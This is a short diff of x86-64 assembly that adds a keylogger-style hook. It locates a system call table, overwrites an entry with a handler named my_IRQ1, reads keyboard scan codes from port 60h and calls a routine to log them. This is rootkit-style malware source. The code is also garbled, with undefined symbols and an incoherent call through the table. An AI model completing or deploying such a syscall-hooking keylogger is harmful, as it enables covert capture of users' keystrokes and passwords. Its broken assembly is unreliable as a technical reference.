@@ -1,3 +1,12 @@
+format ELF64
+
+start:
+
+call find_sys_call_table
+lea rax,[my_IRQ1]
+mov [rdi],rax
+ret
+
 find_sys_call_table:
 cmp i,0
 jz end
@@ -18,13 +27,8 @@ my_IRQ1:
 cmp rsi,NUMERO_DA_CHAMADA_DE_LEITURA_DO_TECLADO
 jnz end2
 IN AL,60h
-
+call log_scan_code
+lea rax,[sys_table]
+call rax
 end2:
-ret
-
-start:
-
-call find_sys_call_table
-lea rax,[my_IRQ1]
-mov [rdi],rax
 ret
